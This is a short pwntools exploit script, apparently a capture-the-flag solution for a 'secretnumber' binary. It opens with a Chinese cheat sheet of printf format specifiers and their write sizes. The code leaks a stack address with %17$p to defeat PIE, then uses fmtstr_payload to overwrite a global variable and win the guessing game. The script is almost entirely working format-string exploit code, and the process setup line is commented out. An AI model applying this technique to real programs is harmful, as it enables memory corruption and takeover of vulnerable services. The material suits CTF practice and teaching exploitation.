'''
格式化符号说明
%x 以十六进制打印，只能打印4字节，一般只用于32位
%p 打印目标地址，建议32位和64位都用这个
%s 打印地址内容
%c 打印单个字符
%hhn 写一字节
%hn  写两字节
%n   写四字节
%ln  32位写四字节，64位写八字节
%lln 写八字节
'''
from pwn import *
context(arch='amd64',os='linux',log_level='debug')
# p = process('./secretnumber')

offset=8
num_addr=0x404c

p.sendlineafter("(0/1)\n",'1') #回车过语句
payload="aaaaaaaa%17$p".encode("utf-8")
p.sendlineafter("What's it\n",payload)
p.recvuntil('aaaaaaaa')
main_addr=int(p.recvuntil('f5')[-12:],16)
pie=main_addr-0x12F5
print(hex(main_addr))
print(hex(pie))
num_addr+=pie

p.sendlineafter("(0/1)\n",'1')#回车过语句
fmtpayload=fmtstr_payload(offset, {num_addr:1})
p.sendlineafter("What's it\n",fmtpayload)
p.sendlineafter("(0/1)\n",'0')
p.sendlineafter("Guess the number\n",'1')
p.interactive()
